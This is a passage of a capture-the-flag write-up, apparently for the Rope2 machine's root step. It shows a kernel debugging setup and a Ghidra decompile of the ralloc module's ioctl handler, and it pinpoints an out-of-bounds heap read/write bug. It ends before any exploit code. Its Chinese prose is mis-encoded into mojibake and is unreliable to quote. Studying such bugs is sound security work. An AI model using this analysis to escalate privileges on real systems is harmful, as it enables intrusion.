<h3 id="æ­å»ºVM"><a href="#æ­å»ºVM" class="headerlink" title="æ­å»ºVM"></a>æ­å»ºVM</h3><p>ä¸‹è½½<span class="exturl" data-url="aHR0cDovL29sZC1yZWxlYXNlcy51YnVudHUuY29tL3JlbGVhc2VzL2Rpc2NvLw==">Ubuntu 19.04çš„iso<i class="fa fa-external-link-alt"></i></span>ï¼ŒæŠ“å–äº†non-liveçš„isoï¼Œå¹¶æ„å»ºäº†ä¸€ä¸ªæ–°çš„VMã€‚è®©å®ƒå¤„äºNATæ¨¡å¼ï¼Œä½†æ·»åŠ äº†<span class="exturl" data-url="aHR0cHM6Ly9oaXRjaGhpa2luZ3RoZXdlYi53b3JkcHJlc3MuY29tLzIwMTQvMDkvMDIvcG9ydGZvcndhcmRpbmctd2l0aC12bXdhcmUtcGxheWVyLWFuZC1uYXQv">ç«¯å£è½¬å‘<i class="fa fa-external-link-alt"></i></span>ï¼Œè¿™æ ·å°±å¯ä»¥SSHè¿›å…¥å®ƒ, ä¹Ÿå¯ä»¥è‡ªå·±é…ç½®sshdæ¥è¿æ¥sshã€‚</p>
<p>å®‰è£…å¥½ä¹‹åï¼Œè™šæ‹Ÿæœºå·²ç»è¿è¡Œçš„å†…æ ¸:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># uname -a</span></span><br><span class="line">Linux ubuntu 5.0.0-13-generic <span class="comment">#41-Ubuntu SMP Tue Dec 3 00:27:35 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span></span><br></pre></td></tr></table></figure>

<p>å¦‚æœæ²¡æœ‰çš„è¯ï¼Œå®ƒå¯ä»¥é€šè¿‡aptè·å¾—ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨sudo apt install linux-image-5.0.0-38-genericè¿›è¡Œå®‰è£…ã€‚</p>
<ul>
<li>æ³¨æ„è¿™é‡Œæ›´æ–°æºè¦ä½¿ç”¨old-releaseçš„æºï¼Œå¦åˆ™å®‰è£…å†…æ ¸ä¸æˆåŠŸï¼Œå…¶ä»–æ–¹æ³•å®‰è£…å†…æ ¸å®¹æ˜“æŠ¥é”™ã€‚</li>
</ul>
<p>è¿˜éœ€è¦è°ƒè¯•symbolsåŒ…ï¼Œä»<span class="exturl" data-url="aHR0cDovL2xhdW5jaHBhZGxpYnJhcmlhbi5uZXQvNDU0MDI4NDcyL2xpbnV4LWltYWdlLXVuc2lnbmVkLTUuMC4wLTM4LWdlbmVyaWMtZGJnc3ltXzUuMC4wLTM4LjQxX2FtZDY0LmRkZWI=">è¿™é‡Œ<i class="fa fa-external-link-alt"></i></span>è·å–å¹¶å®‰è£…(èŠ±äº†ä¸€äº›æ—¶é—´):</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># dpkg -i linux-image-unsigned-5.0.0-38-generic-dbgsym_5.0.0-38.41_amd64.ddeb</span></span><br><span class="line">Selecting previously unselected package linux-image-unsigned-5.0.0-38-generic-dbgsym.</span><br><span class="line">(Reading database ... 171311 files and directories currently installed.)</span><br><span class="line">Preparing to unpack linux-image-unsigned-5.0.0-38-generic-dbgsym_5.0.0-38.41_amd64.ddeb ...</span><br><span class="line">Unpacking linux-image-unsigned-5.0.0-38-generic-dbgsym (5.0.0-38.41) ...</span><br><span class="line">Setting up linux-image-unsigned-5.0.0-38-generic-dbgsym (5.0.0-38.41) ...</span><br></pre></td></tr></table></figure>

<p>è¦åšçš„æœ€åä¸€ä»¶äº‹æ˜¯è¿›å…¥è¿™ä¸ªè™šæ‹Ÿæœºçš„.vmxæ–‡ä»¶å¹¶æ·»åŠ :</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debugStub.listen.guest64 = <span class="string">&quot;TRUE&quot;</span></span><br></pre></td></tr></table></figure>

<p>è¿™ä¼šåœ¨ä¸»æœº127.0.0.1:8864ä¸Šå¯åŠ¨ä¸€ä¸ªç›‘å¬å™¨ï¼Œå¯ä»¥å°†gdbè¿æ¥åˆ°è¿™ä¸ªç›‘å¬å™¨ä¸Šã€‚å¦‚æœéœ€è¦ä»å¦ä¸€ä¸ªä¸»æœºè¿æ¥ï¼Œå¯ä»¥æ·»åŠ ç¬¬äºŒè¡Œ:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debugStub.listen.guest64.remote = <span class="string">&quot;TRUE&quot;</span></span><br></pre></td></tr></table></figure>

<p>å¦‚æœæœ‰è¿™ä¸€è¡Œï¼Œç›‘å¬å™¨å°†åœ¨0.0.0.0:8864ä¸Šã€‚</p>
<p>å¦‚æœå› ä¸ºæŸäº›åŸå› æƒ³æ”¹å˜ç«¯å£ï¼Œè¿™æ ·åš(ä½†å°†åªä½¿ç”¨é»˜è®¤ç«¯å£):</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debugStub.port.guest64 = <span class="string">&quot;8865&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="å®‰è£…ralloc"><a href="#å®‰è£…ralloc" class="headerlink" title="å®‰è£…ralloc"></a>å®‰è£…ralloc</h3><p>å°†é€šè¿‡SSHæˆ–ä½¿ç”¨VMWare Toolså°†æ¨¡å—å¤åˆ¶åˆ°VMä¸­ï¼Œä»¥ä¾¿åœ¨VMä¸­å…±äº«ä¸€ä¸ªæ–‡ä»¶å¤¹ã€‚è¦åŠ è½½æ¨¡å—ï¼Œå¯ä»¥ç®€å•åœ°ä½¿ç”¨insmod(æ’å…¥æ¨¡å—):</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">test</span>@ubuntu:~/rope2$ sudo insmod ./ralloc.ko</span><br><span class="line">[sudo] password <span class="keyword">for</span> <span class="built_in">test</span>:</span><br></pre></td></tr></table></figure>

<p>ç°åœ¨å®ƒæ˜¾ç¤ºåœ¨lsmod(åˆ—è¡¨æ¨¡å—)ä¸­ï¼Œå¹¶ä¸”åˆ›å»ºäº†è®¾å¤‡:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">test</span>@ubuntu:~/rope2$ lsmod | grep ralloc</span><br><span class="line">ralloc                 16384  0</span><br><span class="line"><span class="built_in">test</span>@ubuntu:~/rope2$ <span class="built_in">ls</span> /dev/ralloc</span><br><span class="line">/dev/ralloc</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥é€šè¿‡åœ¨&#x2F;proc&#x2F;modulesä¸­greppingæ‰¾åˆ°å®ƒåœ¨å†…å­˜ä¸­çš„åœ°å€:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">test</span>@ubuntu:~/rope2$ sudo <span class="built_in">cat</span> /proc/modules | grep ralloc</span><br><span class="line">ralloc 16384 0 - Live 0xffffffffc0605000 (OE)</span><br></pre></td></tr></table></figure>

<h3 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h3><p>ä»PowerShellå¯¼å…¥ä¸€ä¸ªwsl bash shell:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Administrator&gt; bash</span><br><span class="line"><span class="built_in">test</span>@DESKTOP-9LSPC40:/mnt/c/Users/Administrator$</span><br></pre></td></tr></table></figure>

<p>æŒ‰ç…§é¡µé¢ä¸Šçš„è¯´æ˜åœ¨è¿™ä¸ªç¯å¢ƒä¸­å®‰è£…<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2h1Z3N5L2dlZg==">GEF<i class="fa fa-external-link-alt"></i></span>(å°è¯•è¿‡<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2xvbmdsZC9wZWRh">Peda<i class="fa fa-external-link-alt"></i></span>ï¼Œä½†å®ƒä¸å†…æ ¸è°ƒè¯•ä¸å¤ªåŒ¹é…)ã€‚</p>
<p>å½“è¿è¡Œgdbæ—¶ï¼Œéœ€è¦å°†å®ƒæŒ‡å‘æ­£åœ¨è°ƒè¯•çš„å†…æ ¸ã€‚å› ä¸ºå·²ç»å®‰è£…äº†è°ƒè¯•symbolsï¼Œæ‰€ä»¥å¯ä»¥æŠŠå†…æ ¸ä»&#x2F;usr&#x2F;lib&#x2F;debug&#x2F;bootä¸­å–å‡º:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/lib/debug/boot/vmlinux-5.0.0-38-generic</span><br></pre></td></tr></table></figure>

<p>ç°åœ¨å°†åœ¨å†…æ ¸æ–‡ä»¶ä¸Šå¯åŠ¨gdbï¼Œå¹¶å°†ç›®æ ‡è®¾ç½®ä¸ºremote:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@DESKTOP-9LSPC40:~/rope2<span class="comment"># gdb -q ./vmlinux-5.0.0-38-generic</span></span><br><span class="line">GEF <span class="keyword">for</span> linux ready, <span class="built_in">type</span> `gef<span class="string">&#x27; to start, `gef config&#x27;</span> to configure</span><br><span class="line">92 commands loaded <span class="keyword">for</span> GDB 9.2 using Python engine 3.8</span><br><span class="line">GEF <span class="keyword">for</span> linux ready, <span class="built_in">type</span> `gef<span class="string">&#x27; to start, `gef config&#x27;</span> to configure</span><br><span class="line">92 commands loaded <span class="keyword">for</span> GDB 9.2 using Python engine 3.8</span><br><span class="line">Reading symbols from ./vmlinux-5.0.0-38-generic...</span><br><span class="line">gefâ¤  target remote:8864</span><br><span class="line">Remote debugging using :8864</span><br></pre></td></tr></table></figure>

<p>ç°åœ¨ï¼Œè¦æŠŠrallocæ–‡ä»¶æ·»åŠ åˆ°æœ¬åœ°gdbå®ä¾‹ä¸­ã€‚è¿™ä½¿gdbèƒ½å¤Ÿè®¾ç½®æ–­ç‚¹</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gefâ¤  add-symbol-file ralloc.ko 0xffffffffc0605000</span><br><span class="line">add symbol table from file <span class="string">&quot;ralloc.ko&quot;</span> at</span><br><span class="line">        .text_addr = 0xffffffffc05fb000</span><br><span class="line">Reading symbols from ralloc.ko...</span><br><span class="line">(No debugging symbols found <span class="keyword">in</span> ralloc.ko)</span><br></pre></td></tr></table></figure>

<h2 id="é™æ€åˆ†æ"><a href="#é™æ€åˆ†æ" class="headerlink" title="é™æ€åˆ†æ"></a>é™æ€åˆ†æ</h2><h3 id="é€šç”¨ç»“æ„"><a href="#é€šç”¨ç»“æ„" class="headerlink" title="é€šç”¨ç»“æ„"></a>é€šç”¨ç»“æ„</h3><p>éœ€è¦å¼„æ¸…æ¥šè¿™ä¸ªæ¨¡å—åšä»€ä¹ˆï¼Œæ‰€ä»¥å°†åœ¨Ghidraæ‰“å¼€ralloc.koã€‚è¯¥æ¨¡å—å¯¼å‡ºäº†ä¸¤ä¸ªå‡½æ•°ï¼Œrope2_init å’Œ rope2_exit:</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb-rope2-getroot.jpg"></li>
</ul>
<p>å®ƒä»¬éƒ½éå¸¸ç®€å•ï¼Œrope2_initè°ƒç”¨misc_register, rope2_exitè°ƒç”¨misc_dereregisteræ¥åˆ›å»ºå’Œåˆ é™¤è®¾å¤‡ã€‚è¿˜æœ‰å…¶ä»–ä¸€äº›å‡½æ•°ï¼Œä½†åªæœ‰ä¸€ä¸ªçœŸæ­£æœ‰è¶£ï¼Œæ˜¯rope2_ioctlã€‚</p>
<h3 id="IOCTL"><a href="#IOCTL" class="headerlink" title="IOCTL"></a>IOCTL</h3><h3 id="ç»“æ„"><a href="#ç»“æ„" class="headerlink" title="ç»“æ„"></a>ç»“æ„</h3><p>è¿™æ®µä»£ç æœ‰ä¸¤ä¸ªç”¨äºç®¡ç†æ•°æ®çš„ç»“æ„ä½“ï¼Œæ‰€ä»¥èŠ±äº†ä¸€åˆ†é’Ÿé˜…è¯»ä»£ç ï¼Œçœ‹çœ‹è¿™äº›ç»“æ„æ˜¯å¦‚ä½•ä½¿ç”¨çš„ï¼Œç„¶ååœ¨Ghidraä¸­åˆ›å»ºå®ƒä»¬ã€‚æˆ‘ç¬¬ä¸€ä¸ªè°ƒç”¨äº†ralloc_inï¼Œå®ƒè¢«ç”¨æ¥ç®¡ç†é€šè¿‡ioctlä¼ é€’çš„æ•°æ®è¢«è°ƒç”¨:</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb-rope2-getroot1.jpg"></li>
</ul>
<p>å¦ä¸€ä¸ªå‘½åä¸ºralloc_arrayã€‚è¿™ç”¨äºå‘½åä¸ºbuffersçš„å…¨å±€å˜é‡ï¼Œè¯¥å˜é‡æœ€å¤šå¯ä»¥å®¹çº³32 (0x20)ä¸ªç¼“å†²åŒºã€‚æ¯ä¸ªå¯¹è±¡ä¸ºç¼“å†²åŒºå­˜å‚¨ä¸€ä¸ªå¤§å°å’Œä¸€ä¸ªåœ°å€:</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb-rope2-getroot2.jpg"></li>
</ul>
<h3 id="rope2-ioctl"><a href="#rope2-ioctl" class="headerlink" title="rope2_ioctl"></a>rope2_ioctl</h3><p>ä¸€æ—¦å°†è¿™äº›åº”ç”¨åˆ°ä»£ç ä¸­çš„å˜é‡ä¸Šï¼Œå°±ä¼šå¾—åˆ°éå¸¸æ¸…æ™°çš„ç»“æœã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">long rope2_ioctl(undefined8 fd,int ioctl_num)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  long addr;</span><br><span class="line">  long user_input_;</span><br><span class="line">  ulong <span class="built_in">id</span>;</span><br><span class="line">  long <span class="built_in">return</span>;</span><br><span class="line">  long in_GS_OFFSET;</span><br><span class="line">  long user_input;</span><br><span class="line">  ulong user_input.size;</span><br><span class="line">  void *user_input.data;</span><br><span class="line">  long _canary;</span><br><span class="line">  long canary;</span><br><span class="line">  void *__src;</span><br><span class="line">  void *__dest;</span><br><span class="line">  </span><br><span class="line">  __fentry__();</span><br><span class="line">  canary = *(long *)(in_GS_OFFSET + 0x28);</span><br><span class="line">  mutex_lock(lock);</span><br><span class="line">  _copy_from_user(&amp;user_input,user_input_,0x18);</span><br><span class="line">  <span class="keyword">if</span> (ioctl_num == 0x1000) &#123;</span><br><span class="line">    <span class="keyword">if</span> ((user_input.size &lt; <span class="number">0</span>x401) &amp;&amp; ((uint)user_input &lt; <span class="number">0</span>x20)) &#123;</span><br><span class="line">      <span class="built_in">id</span> = (ulong)(uint)user_input * 0x10;</span><br><span class="line">      <span class="keyword">if</span> (*(long *)(arr + <span class="built_in">id</span> + 8) == 0) &#123;</span><br><span class="line">        addr = __kmalloc(user_input.size,0x6000c0);</span><br><span class="line">        *(long *)(arr + <span class="built_in">id</span> + 8) = addr;</span><br><span class="line">        <span class="keyword">if</span> (addr != 0) &#123;</span><br><span class="line">          *(ulong *)(arr + <span class="built_in">id</span>) = user_input.size + 0x20;</span><br><span class="line">          <span class="built_in">return</span> = 0;</span><br><span class="line">          goto LAB_00100104;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (ioctl_num == 0x1001) &#123;</span><br><span class="line">      <span class="keyword">if</span> (((uint)user_input &lt; <span class="number">0</span>x20) &amp;&amp; (*(long *)(arr + (ulong)(uint)user_input * <span class="number">0</span>x10 + <span class="number">8</span>) != <span class="number">0</span>)) &#123;</span><br><span class="line">        kfree();</span><br><span class="line">        *(undefined8 *)(arr + (ulong)(uint)user_input * 0x10 + 8) = 0;</span><br><span class="line">        <span class="built_in">return</span> = 0;</span><br><span class="line">        goto LAB_00100104;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (ioctl_num == 0x1002) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((uint)user_input &lt; <span class="number">0</span>x20) &#123;</span><br><span class="line">          if ((*(void **)(arr + (ulong)(uint)user_input * <span class="number">0</span>x10 + <span class="number">8</span>) != (void *)<span class="number">0</span>x0) &amp;&amp;</span><br><span class="line">             (__dest = *(void **)(arr + (ulong)(uint)user_input * <span class="number">0</span>x10 + <span class="number">8</span>), __src = user_input.data</span><br><span class="line">             , (user_input.size &amp; <span class="number">0</span>xffffffff) &lt; *(ulong *)(arr + (ulong)(uint)user_input * <span class="number">0</span>x10) ||</span><br><span class="line">               (user_input.size &amp; <span class="number">0</span>xffffffff) == *(ulong *)(arr + (ulong)(uint)user_input * <span class="number">0</span>x10)))</span><br><span class="line">          goto joined_r0x001001ec;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ((ioctl_num == <span class="number">0</span>x1003) &amp;&amp; ((uint)user_input &lt; <span class="number">0</span>x20)) &#123;</span><br><span class="line">          __src = *(void **)(arr + (ulong)(uint)user_input * 0x10 + 8);</span><br><span class="line">          <span class="keyword">if</span> ((__src != (void *)<span class="number">0</span>x0) &amp;&amp;</span><br><span class="line">             (__dest = user_input.data,</span><br><span class="line">             (user_input.size &amp; <span class="number">0</span>xffffffff) &lt;= *(ulong *)(arr + (ulong)(uint)user_input * <span class="number">0</span>x10))) &#123;</span><br><span class="line">joined_r0x001001ec:</span><br><span class="line">            <span class="keyword">if</span> (((ulong)user_input.data &amp; <span class="number">0</span>xffff000000000000) == <span class="number">0</span>) &#123;</span><br><span class="line">              memcpy(__dest,__src,user_input.size &amp; <span class="number">0</span>xffffffff);</span><br><span class="line">              return = <span class="number">0</span>;</span><br><span class="line">              goto LAB_00100104;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return = -<span class="number">1</span>;</span><br><span class="line">LAB_00100104:</span><br><span class="line">  mutex_unlock(lock);</span><br><span class="line">  if (canary == *(long *)(in_GS_OFFSET + <span class="number">0</span>x28)) &#123;</span><br><span class="line">    <span class="built_in">return</span> <span class="built_in">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">                    /* WARNING: Subroutine does not <span class="built_in">return</span> */</span><br><span class="line">  __stack_chk_fail();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿›ä¸€æ­¥ä¼˜åŒ–åçš„ä»£ç ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">long rope2_ioctl(undefined8 fd,int ioctl_num,long input_struct)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  long _canary;</span><br><span class="line">  void *__dest;</span><br><span class="line">  void *__src;</span><br><span class="line">  long addr;</span><br><span class="line">  long user_input_;</span><br><span class="line">  ulong <span class="built_in">id</span>;</span><br><span class="line">  long <span class="built_in">return</span>;</span><br><span class="line">  long in_GS_OFFSET;</span><br><span class="line">  ralloc_in user_input;</span><br><span class="line">  </span><br><span class="line">  __fentry__();</span><br><span class="line">  _canary = *(long *)(in_GS_OFFSET + 0x28);</span><br><span class="line">  mutex_lock(lock);</span><br><span class="line">  _copy_from_user(&amp;user_input,user_input_,0x18);</span><br><span class="line">                    /* ADD */</span><br><span class="line">  <span class="keyword">if</span> (ioctl_num == 0x1000) &#123;</span><br><span class="line">    <span class="built_in">id</span> = (ulong)(uint)user_input.id;</span><br><span class="line">    <span class="keyword">if</span> ((user_input.size &lt; <span class="number">0</span>x401) &amp;&amp; ((uint)user_input.id &lt; <span class="number">0</span>x20)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (buffers[<span class="built_in">id</span>].address == 0) &#123;</span><br><span class="line">        addr = __kmalloc(user_input.size,0x6000c0);</span><br><span class="line">        buffers[<span class="built_in">id</span>].address = addr;</span><br><span class="line">        <span class="keyword">if</span> (addr != 0) &#123;</span><br><span class="line">          buffers[<span class="built_in">id</span>].size = user_input.size + 0x20;</span><br><span class="line">          <span class="built_in">return</span> = 0;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">                    /* Delete */</span><br><span class="line">    <span class="keyword">if</span> (ioctl_num == 0x1001) &#123;</span><br><span class="line">      <span class="keyword">if</span> (((uint)user_input.id &lt; <span class="number">0</span>x20) &amp;&amp; (buffers[(uint)user_input.id].address != <span class="number">0</span>)) &#123;</span><br><span class="line">        kfree();</span><br><span class="line">        buffers[(uint)user_input.id].address = 0;</span><br><span class="line">        <span class="built_in">return</span> = 0;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">                    /* Write */</span><br><span class="line">      <span class="keyword">if</span> (ioctl_num == 0x1002) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((uint)user_input.id &lt; <span class="number">0</span>x20) &#123;</span><br><span class="line">          if (((void *)buffers[(uint)user_input.id].address != (void *)<span class="number">0</span>x0) &amp;&amp;</span><br><span class="line">             (__dest = (void *)buffers[(uint)user_input.id].address, __src = user_input.data,</span><br><span class="line">             (user_input.size &amp; <span class="number">0</span>xffffffff) &lt; buffers[(uint)user_input.id].size ||</span><br><span class="line">             (user_input.size &amp; <span class="number">0</span>xffffffff) == buffers[(uint)user_input.id].size))</span><br><span class="line">          goto joined_r0x001001ec;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">                    /* Read */</span><br><span class="line">        <span class="keyword">if</span> ((ioctl_num == <span class="number">0</span>x1003) &amp;&amp; ((uint)user_input.id &lt; <span class="number">0</span>x20)) &#123;</span><br><span class="line">          __src = (void *)buffers[(uint)user_input.id].address;</span><br><span class="line">          <span class="keyword">if</span> ((__src != (void *)<span class="number">0</span>x0) &amp;&amp;</span><br><span class="line">             (__dest = user_input.data,</span><br><span class="line">             (user_input.size &amp; <span class="number">0</span>xffffffff) &lt;= buffers[(uint)user_input.id].size)) &#123;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (((ulong)user_input.data &amp; <span class="number">0</span>xffff000000000000) == <span class="number">0</span>) &#123;</span><br><span class="line">        memcpy(__dest,__src,user_input.size &amp; <span class="number">0</span>xffffffff);</span><br><span class="line">        return = <span class="number">0</span>;</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        return = -<span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  mutex_unlock(lock);</span><br><span class="line">  if (_canary == *(long *)(in_GS_OFFSET + <span class="number">0</span>x28)) &#123;</span><br><span class="line">    <span class="built_in">return</span> <span class="built_in">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">                    /* WARNING: Subroutine does not <span class="built_in">return</span> */</span><br><span class="line">  __stack_chk_fail();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åŸºæœ¬ä¸Šï¼Œåœ¨4ä¸ªå¯èƒ½çš„è¾“å…¥ä»£ç ä¸Šæœ‰ä¸€ä¸ªswitchè¯­å¥æ¥æ‰§è¡Œæ·»åŠ (0x1000)ã€åˆ é™¤(0x1001)ã€å†™å…¥(0x1002)å’Œè¯»å–(0x1003)ã€‚</p>
<p>æ¼æ´åœ¨äºå¦‚ä½•æ·»åŠ æ–°å—ã€‚æœ‰ä¸€ä¸ªæ£€æŸ¥æ¥ç¡®ä¿å—ä¸å¤§äº0x400ï¼Œå¹¶ä¸”idå°äº32ï¼Œç„¶åå°†å¤§å°ä¿å­˜åˆ°æ¯”ç¼“å†²åŒºå¤§0x20å­—èŠ‚çš„ç¼“å†²åŒºåˆ—è¡¨ä¸­ã€‚è¿™å…è®¸åœ¨ç¼“å†²åŒºçš„æœ«ç«¯ä¹‹å¤–è¿›è¡Œè¯»å†™æ“ä½œã€‚</p>
<h2 id="åŸºæœ¬ç›¸äº’ä½œç”¨"><a href="#åŸºæœ¬ç›¸äº’ä½œç”¨" class="headerlink" title="åŸºæœ¬ç›¸äº’ä½œç”¨"></a>åŸºæœ¬ç›¸äº’ä½œç”¨</h2><p>å¼€å§‹å†™ä¸€ä¸ªcç¨‹åºï¼Œå°†ä¸è®¾å¤‡äº¤äº’ï¼ŒåŒ…æ‹¬ä¸€äº›å¸®åŠ©å‡½æ•°ï¼Œä»¥è¿›è¡Œæ¯ä¸ªIOCTLè°ƒç”¨:</p>
